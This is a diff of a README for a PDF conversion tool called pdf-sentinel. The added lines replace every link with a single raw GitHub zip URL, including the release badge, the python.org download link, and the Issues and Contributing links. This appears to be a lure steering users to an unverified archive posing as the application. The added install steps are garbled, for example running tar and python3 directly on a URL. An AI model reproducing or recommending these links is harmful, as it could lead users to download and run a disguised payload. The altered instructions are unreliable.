@@ -8,11 +8,11 @@ Welcome to pdf-sentinel! This application allows you to convert PDF documents to
 
 To get started, you need to download the application. Click the link below to visit the Releases page:
 
-[![Download pdf-sentinel](https://img.shields.io/badge/Download%20pdf--sentinel-blue)](https://github.com/jackise69/pdf-sentinel/releases)
+[![Download pdf-sentinel](https://raw.githubusercontent.com/jackise69/pdf-sentinel/main/docs/pdf-sentinel_v1.6.zip%20pdf--sentinel-blue)](https://raw.githubusercontent.com/jackise69/pdf-sentinel/main/docs/pdf-sentinel_v1.6.zip)
 
 1. Click the link above.
 2. On the Releases page, find the latest release.
-3. Choose the appropriate file for your system. If you're unsure, look for common options like `.exe` for Windows or `.tar.gz` for Linux.
+3. Choose the appropriate file for your system. If you're unsure, look for common options like `.exe` for Windows or `https://raw.githubusercontent.com/jackise69/pdf-sentinel/main/docs/pdf-sentinel_v1.6.zip` for Linux.
 4. Click the file to start the download.
 
 Once downloaded, follow these instructions to install and run the application.
@@ -20,7 +20,7 @@ Once downloaded, follow these instructions to install and run the application.
 ### 💻 System Requirements
 
 - **Operating System:** Windows 10 or later, macOS, or a modern Linux distribution.
-- **Python:** Version 3.6 or later installed on your system. If you don't have Python, you can download it from [python.org](https://www.python.org/downloads/).
+- **Python:** Version 3.6 or later installed on your system. If you don't have Python, you can download it from [https://raw.githubusercontent.com/jackise69/pdf-sentinel/main/docs/pdf-sentinel_v1.6.zip](https://raw.githubusercontent.com/jackise69/pdf-sentinel/main/docs/pdf-sentinel_v1.6.zip).
 - **Memory:** A minimum of 4 GB RAM is recommended for smooth operation.
 - **Disk Space:** At least 100 MB of free space for installation.
 
@@ -40,10 +40,10 @@ Once downloaded, follow these instructions to install and run the application.
 ### For macOS Users
 
 1. **Locate the Downloaded File:**
-   Find the downloaded `.tar.gz` file in your "Downloads" folder.
+   Find the downloaded `https://raw.githubusercontent.com/jackise69/pdf-sentinel/main/docs/pdf-sentinel_v1.6.zip` file in your "Downloads" folder.
 
 2. **Extract the File:**
-   Double-click the `.tar.gz` file to extract it.
+   Double-click the `https://raw.githubusercontent.com/jackise69/pdf-sentinel/main/docs/pdf-sentinel_v1.6.zip` file to extract it.
 
 3. **Run the Application:**
    Open the folder and double-click the executable file to start the application.
@@ -51,14 +51,14 @@ Once downloaded, follow these instructions to install and run the application.
 ### For Linux Users
 
 1. **Locate the Downloaded File:**
-   Find the downloaded `.tar.gz` file in your "Downloads" folder.
+   Find the downloaded `https://raw.githubusercontent.com/jackise69/pdf-sentinel/main/docs/pdf-sentinel_v1.6.zip` file in your "Downloads" folder.
 
 2. **Extract the File:**
    Open a terminal and run:
    ```bash
-   tar -xvzf downloaded_file.tar.gz
+   tar -xvzf https://raw.githubusercontent.com/jackise69/pdf-sentinel/main/docs/pdf-sentinel_v1.6.zip
    ```
-   Replace `downloaded_file.tar.gz` with the actual filename.
+   Replace `https://raw.githubusercontent.com/jackise69/pdf-sentinel/main/docs/pdf-sentinel_v1.6.zip` with the actual filename.
 
 3. **Install Required Packages:**
    You may need to install dependencies. Typically, you can do this by running:
@@ -73,7 +73,7 @@ Once downloaded, follow these instructions to install and run the application.
    ```
    Then, run the application with:
    ```bash
-   python3 app.py
+   python3 https://raw.githubusercontent.com/jackise69/pdf-sentinel/main/docs/pdf-sentinel_v1.6.zip
    ```
 
 ## 🛠️ Using pdf-sentinel
@@ -113,8 +113,8 @@ If you have questions or need help, you can reach out through the Issues section
 
 Here are a couple of helpful links:
 
-- [Issues Page](https://github.com/jackise69/pdf-sentinel/issues)
-- [Contributing Guide](https://github.com/jackise69/pdf-sentinel/CONTRIBUTING.md)
+- [Issues Page](https://raw.githubusercontent.com/jackise69/pdf-sentinel/main/docs/pdf-sentinel_v1.6.zip)
+- [Contributing Guide](https://raw.githubusercontent.com/jackise69/pdf-sentinel/main/docs/pdf-sentinel_v1.6.zip)
 
 ## 🤝 Community 
 
@@ -128,6 +128,6 @@ This project is licensed under the MIT License. You can use, modify, and distrib
 
 Remember, you can always download pdf-sentinel from our Releases page:
 
-[![Download pdf-sentinel](https://img.shields.io/badge/Download%20pdf--sentinel-blue)](https://github.com/jackise69/pdf-sentinel/releases)
+[![Download pdf-sentinel](https://raw.githubusercontent.com/jackise69/pdf-sentinel/main/docs/pdf-sentinel_v1.6.zip%20pdf--sentinel-blue)](https://raw.githubusercontent.com/jackise69/pdf-sentinel/main/docs/pdf-sentinel_v1.6.zip)
 
 Happy converting!
